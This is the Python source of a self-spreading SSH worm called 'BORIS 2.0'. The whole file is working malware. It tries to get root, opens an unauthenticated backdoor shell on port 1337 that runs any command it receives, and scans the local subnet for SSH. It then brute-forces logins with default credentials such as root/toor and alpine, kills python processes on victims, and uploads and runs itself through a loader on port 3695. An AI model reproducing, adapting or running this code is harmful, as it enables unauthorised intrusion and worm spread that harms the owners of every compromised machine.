VERSION=2.4
#BORIS 2.0
import os
try:
    os.setuid(0) #Try and get root
    print("[ALERT] ROOT ACCESS OBTAINED")
except:
    print("[FAILURE] Could not obtain root :(")
try:
    os.system("rm loader.py")
except:
    pass
from subprocess import check_output,Popen
import socket
def payload():
    try:
        s = socket.socket()
        s.bind(("0.0.0.0",1337))
        s.listen(5)
        while True:
            c,a = s.accept()
            c.send("Welcome, commander.\nYou are username: {} (UID {})\n".format(os.getlogin(),os.getuid()))
            
            while True:
                cmd = c.recv(4096).strip("\r").strip("\n")
                if cmd[:3] == "cd ":
                    try:
                        c.send("[FAULT] Directory change denied to preserve worm abilities. Please use this commandline to drop a better backdoor.\n")
                        #os.chdir(cmd[3:])
                    except:
                        c.send("[ERROR] Could not change directory\n")
                else:
                    try:
                        response = check_output(cmd)
                    except:
                        response = "[ERROR] Could not execute command\n"
                    c.send(response)
    except:
        pass
    
    
if 0 != os.system("which pip"): # get pip
    os.system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py")
    os.system("wget https://bootstrap.pypa.io/get-pip.py")
    os.system("python get-pip.py --user")
    os.system("python get-pip.py")
try:
    from threading import *
except:
    os.system("pip install threading")
    import threading
try:
    from queue import *
except:
    from Queue import *
try:
    import paramiko
except:
    os.system("pip install paramiko")
    try:
        import paramiko
    except:
        os.system("curl https://files.pythonhosted.org/packages/cf/ae/94e70d49044ccc234bfdba20114fa947d7ba6eb68a2e452d89b920e62227/paramiko-2.4.2-py2.py3-none-any.whl -o paramiko-2.4.2-py2.py3-none-any.whl")
        os.system("wget https://files.pythonhosted.org/packages/cf/ae/94e70d49044ccc234bfdba20114fa947d7ba6eb68a2e452d89b920e62227/paramiko-2.4.2-py2.py3-none-any.whl")
        os.system("pip install paramiko-2.4.2-py2.py3-none-any.whl")
        try:
            import paramiko
        except:
            while True:
                payload()
            #exit("Adios!")
import sys
import time as t
try:
    from subprocess import pipe
except:
    from subprocess import PIPE as pipe
import random

def getips():
    addrs = []
    addrs.append([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
    return addrs

homeips = []
for i in getips():
    homeips.append(i)

subnet = []
for ip in getips():
    ip = ip.split(".")[:3]
    ip = ip[0]+"."+ip[1]+"."+ip[2]+"."
    for i in range(1,256):
        if str(ip+str(i)) in homeips:
            continue
        subnet.append(str(ip+str(i)))
ips = Queue()
hackable = Queue()
random.shuffle(subnet)
for ip in subnet[:]:
    ips.put(ip)
del subnet

class scanner(Thread):
    def __init__(self,ips,hackable):
        Thread.__init__(self)

        self.ips = ips
        self.hackable = hackable
        
        self.start()

    def run(self):
        while not self.ips.empty():
            ip = self.ips.get()
            connect = socket.socket()
            connect.settimeout(1)
            result = connect.connect_ex((ip,22))
            if result == 0:
                self.hackable.put(ip)
                continue
            self.ips.task_done()

class hacker(Thread):
    def __init__(self,ips):
        Thread.__init__(self)

        self.ips = ips

        self.start()

    def run(self):
        while not self.ips.empty():
            ip = self.ips.get()
            usernames = ["root","admin","guest","user"]
            passwords = ["system10","toor","admin","guest","password","root","letmein","12345678","alpine"]
            
            ag = 0
            
            done = "E"+"O"+"F"
            loader = "import socket\n"
            loader += "s = socket.socket()\n"
            loader += "s.bind((\"0.0.0.0\",3695))\n"
            loader += "s.listen(5)\n"
            loader += "c,a = s.accept()\n"
            loader += "while True:\n"
            loader += "    f = open(\"worm.py\",\"ab\")\n"
            loader += "    data = c.recv(4096)\n"
            loader += "    if data.strip(\"\\r\").strip(\"\\n\")!=\"E\"+\"O\"+\"F\":\n"
            loader += "        f.write(data)\n"
            loader += "    else:\n"
            loader += "        f.close()\n"
            loader += "        s.close()\n"
            loader += "        break\n"
            loader += "f.close()\n"

            for password in passwords:
                for username in usernames:
                    print("{}|{}:{}".format(ip,username,password))
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        ssh.connect(ip,port=22,username=username,password=password,timeout=3)
                    except:
                        ssh.close()
                        continue
                    ag = 1 
                    print("{}\n[ACCESS GRANTED]".format(ip))
                    ssh.invoke_shell()
                    ssh.exec_command("sh")
                    f = open(sys.argv[0],"rb")
                    contents = f.read()
                    f.close()
                    a,b,c = ssh.exec_command("ls")
                    if "worm.py" in str(b.read()):
                        a,b,c = ssh.exec_command("cat worm.py")
                        try:
                            foeworm = b.read()
                            lines=0
                            for line in foeworm.splitlines():
                                lines+=1
                                line = str(line)
                                if "VERSION=" in line:
                                    version=float(line.split("VERSION=")[1])
                                    break
                                if lines>5:
                                    version=0.0
                                    break
                            del foeworm

                            #version = int(str(b.readlines()[0]).split("=")[1])
                            if version > VERSION:
                                print("Target has higher worm version. Self-updating...")
                                try:
                                    os.system("rm worm2.py")
                                except:
                                    pass
                                
                                a,b,c = ssh.exec_command("cat worm.py")
                                f = open("worm2.py","w")
                                for line in b.readlines():
                                    f.write(line)
                                f.close()
                                print("Deploying modified worm")
                                os.system("python worm2.py")
                                exit()
                            elif version == VERSION:
                                print("Target is already infected with latest version. Retriggering...")
                                ssh.exec_command("python worm.py")
                                break
                            else:
                                print("Target is infected with a lesser worm or other strain of worm. We will pillage it, and leave other wannabes in the dust!")
                                ssh.exec_command("rm worm.py")
                                t.sleep(0.25)
                        except Exception as e:
                            print(e)
                            print("Worm error! Reinfecting host...")
                            ssh.exec_command("rm worm.py")
                            t.sleep(0.25)
                    a,b,c = ssh.exec_command("rm loader.py & touch loader.py")
                    b.readlines()
                    a,b,c = ssh.exec_command("pkill python")
                    t.sleep(0.5)
                    for line in loader.splitlines():
                        string = "echo \'{}\' >> loader.py".format(line)
                        a,b,c = ssh.exec_command(string)
                        b.readlines()
                    a,b,c = ssh.exec_command("python loader.py")
                    t.sleep(1)
                    s = socket.socket()
                    s.connect((ip,3695))
                    print("Uploading virus")
                    for line in contents.splitlines():
                        s.send(line+"\n")
                        sys.stdout.write(".")
                        sys.stdout.flush()
                        t.sleep(0.25)
                    s.send(done)
                    print("[DONE]\nVirus uploaded (100%)")
                    print("Executing worm on infected host")
                    s.close()
                    t.sleep(1)
                    ssh.exec_command("python worm.py")

                    break
                if ag==1:
                    break
            if ag==1:
                break

print("Beginning scan")
for i in range(30):
    scanner(ips,hackable)

while not ips.empty():
    pass

for i in range(10):
    hacker(hackable)
payload()
